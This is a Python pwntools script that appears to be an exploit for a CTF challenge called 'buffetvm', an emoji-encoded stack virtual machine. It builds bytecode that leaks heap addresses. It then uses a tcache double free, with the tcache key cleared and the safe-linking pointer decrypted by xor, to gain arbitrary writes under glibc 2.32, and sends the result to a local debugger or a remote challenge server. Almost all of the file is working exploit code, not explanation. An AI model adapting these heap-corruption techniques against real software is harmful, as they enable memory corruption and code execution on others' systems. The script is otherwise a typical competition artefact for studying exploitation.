from pwn import *
import time
import base64

# -*- coding: utf-8 -*-

# push 0, pop 1, read_io 2, write_io 3, alloc 4, free 5, read_mem 6, write_mem 7, 
# nop 8, halt 9, add 10, mul 11, lsh 12, rsh 13, swap 14, dup 15, xor 16, and 17, sub 18
inst = ['🍴', '🍿', '🍦', '🍨', '🥣', '😋', '🥢', '🥄', 
        '🥤', '👋', '🍇', '🍉', '🍎', '🍏', '🥂', '🍻', '🍌', '🍍', '🍈']
digit = ['🍞', '🥐', '🥖', '🥨', '🥯', '🥞', '🍪', '🍰', '🥧', '🍮']

#payload = '🥣🍞🥣🥐🥣🥖🍦😋🍞😋🥐😋🥖🍦😋🍞👋'
#payload = '🥣🍞🥣🥐🥣🥖😋🍞😋🥐😋🥖🥤🥤🥤🥤🍴🥖🍴🥨🍎🥢🥐🍞🍴🥧🥢🥐🥐🍴🥧🥢🥐🥖🍴🥧🥢🥐🥨🍴🥧🥢🥐🥯🍴🥧🥢🥐🥞🥤🥤🥤🥤🍎🍇🍎🍇🍎🍇🍎🍇🍎🍇🍏🍦👋'
heap_aslr = 0
heap_ck = 0

def alloc(n):
    return inst[4] + digit[n]
    
def free(n):
    return inst[5] + digit[n]

def make10():
    return inst[0] + digit[1] + inst[0] + digit[9] + inst[10] 

def makebyte(n):             # push 0 ~ 255
    st = ''
    for i in reversed(str(n)):
        st += inst[0] + digit[int(i)]
    for i in range(len(str(n))-1):
        st += make10()
        st += inst[11]
        st += inst[10]
    return st

def getaddr(n):         # print addr byte with adding 9*9
    size = 8
    st = ''
    for i in reversed(range(size)):
        st += inst[6] + digit[n] + digit[i]
        st += inst[15]      # dup
        st += makebyte(15)  # push 0xf
        st += inst[17]      # and
        st += inst[0] + digit[9] + inst[15] + inst[11] + inst[10]   # byte & 0xf + 81
        st += inst[14] + inst[0] + digit[4] + inst[14] + inst[13]   # swap, push 4, swap, rsh
        st += inst[0] + digit[9] + inst[15] + inst[11] + inst[10]   # byte >> 4 + 81
        #st += inst[14]      # byte >> 4, byte & 0xf ...
    st += inst[3] * size * 2       # write_io
    return st

def numtobyte():
    st = ''
    for i in range(8):
        st += inst[15]                  # dup
        st += makebyte(i*8)
        st += makebyte(255)             # 0xff
        st += inst[12]                  # lsh, 0xff << [0, 8, 16, ...]
        st += inst[17]                  # and
        st += makebyte(i*8) + inst[14] + inst[13]    # rsh to fit the range of byte
        st += inst[14]                  # swap

    st += inst[1]           # pop the original number

    return st

def makenum(val):
    # val should be 8bytes-length
    st = ''
    for i in range(8):
        tmp = val & 0xff
        st += makebyte(tmp)
        val >>= 8
    '''
    st += inst[0] + digit[0]
    for i in range(8):
        st += inst[0] + digit[8]                # push[8]
        st += inst[14] + inst[12] + inst[10]    # swap, lsh, add
    '''
    return st

def memtostack(n):
    st = ''
    for i in range(8):
        st += inst[6] + digit[n] + digit[i]
    st += inst[0] + digit[0]
    for i in range(8):
        st += inst[0] + digit[8]                # push[8]
        st += inst[14] + inst[12] + inst[10]    # swap, lsh, add
    return st

def putaddr(n):
    st = ''
    #st += inst[3] * 8
    for i in reversed(range(8)):
        st += (inst[7] + digit[n] + digit[i])
    return st

def putkthaddr(n):
    st = ''
    st += (inst[7] + digit[n] + digit[9]) * 7
    st += inst[7] + digit[n] + digit[8]
    return st

def aaw(val, n):
    st = ''
    '''
    st += "".join(alloc(i) for i in range(2))
    st += "".join(free(i) for i in range(2))
    
    st += inst[0] + digit[0]                # disable tcache_entry->key
    st += inst[7] + digit[0] + digit[8]
    st += inst[0] + digit[0]
    st += inst[7] + digit[0] + digit[9]
    '''
    st += alloc(4) + free(4)                # mem[4], mem[5] will be use for aaw
    st += inst[0] + digit[0]                # disable tcache_entry->key
    st += inst[7] + digit[4] + digit[8]
    st += inst[0] + digit[0]
    st += inst[7] + digit[4] + digit[9]
    st += free(4)                           # double free
    
    st += memtostack(0)                     # heap ASLR base
    st += memtostack(4)                     # heap chunk addr (refers itself)
    st += inst[16]                          # decrypt value (xor)

    st += makebyte(n)
    st += inst[14] + inst[18]               # set arbitrary addr : heap chunk - 0x40
                                            # one trial shift heap chunk 0x20 bytes below
    st += memtostack(0)
    st += inst[16]                          # now there are 8bytes-length value in stack

    st += numtobyte()
    st += putaddr(4)
    st += alloc(5)
    st += alloc(5)                          # now mem[5] is destination

    st += makenum(val)
    st += putkthaddr(5)
    #st += putaddr(5)

    return st

def dec_libc(enc_libc):
    libc = 0
    for i in reversed(range(0, 16, 2)):
        libc <<= 8
        tmp = ((enc_libc[i] - 81) << 4) + (enc_libc[i+1] - 81)
        libc += tmp
    return libc

payload = ''
payload += "".join(alloc(i) for i in range(2))
payload += "".join(free(i) for i in range(2))
payload += getaddr(0)       # leak the heap aslr
payload += getaddr(1)
payload += alloc(9) * 7

payload += inst[2] + inst[1]
payload += alloc(9) * 30
payload += aaw(0x201, 0x10)
payload += inst[2] + inst[1]
#payload += aaw(0x201, 0x230)
payload += aaw(0x201, 0x450)
payload += aaw(0x301, 0x460)
payload += inst[2] + inst[1]

payload += alloc(4)
payload += alloc(9)
payload += alloc(2)
payload += alloc(3)
payload += alloc(6)
payload += alloc(7)
payload += alloc(8)
payload += free(4)
payload += free(9)
payload += free(2)
payload += free(3)
payload += free(6)
payload += free(7)
payload += free(8)

payload += free(5)
payload += inst[2] + inst[1]
"""
payload += inst[2] + inst[1]
payload += aaw(0x200)
payload += inst[2]
"""
'''
payload += alloc(1)
payload += inst[2]
payload += free(0)
payload += inst[2]
payload += alloc(3)
payload += inst[2]
'''
payload += inst[9]

'''
payload = ''
payload += alloc(0)
payload += getaddr(0)
payload += inst[9]
'''
#payload = makebyte(123)
#print(payload)

with open('./emoji', 'w') as file:
    file.write(payload)

#context.aslr = False
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

DEBUG = True
if DEBUG:
    p = gdb.debug(['./ld-2.32.so', './buffetvm', 'emoji'], env={'LD_PRELOAD':'./libc-2.32.so'})  # 0x7ffff7fbd000+0x242F
else:
    p = remote('remote16.goatskin.kr', 63650)
    p.sendlineafter('code: ', base64.b64encode(payload.encode('utf-8')))
    p.recvuntil("Executing your .bvm code...\n")

#time.sleep(1)
enc_libc = p.recv(16)
enc_libc2 = p.recv(16)
#print(b'libc1: '+enc_libc)
#print(b'libc2: '+enc_libc2)
heap_aslr = dec_libc(enc_libc)
heap_ck = dec_libc(enc_libc2)
print(hex(heap_aslr))
print(hex(heap_ck))
print(hex(heap_aslr ^ heap_ck))
#libc = u64(libc)
#print(hex(libc))

#libc1 = p.recv(8)
#libc1 = u64(libc)
#print(hex(libc))
#var = b'\xf0\x9f\xa4\xae'
#var = b'\xf0\x9f\x91\x8b'
#libc = p.recvuntil(var)
#libc = libc.split(var)[0]
#print(len(libc))
#print(libc)
#if len(libc) < 6:
#    exit(0)
#libc = u64(libc+b'\x00\x00')
#print(hex(libc))
#libc = p.recv(0xb)
#for i in range(8):
#    tmp = p.recv(1)
#    libc += tmp
#print(hex(libc))

#gdb.attach(p)

p.interactive()
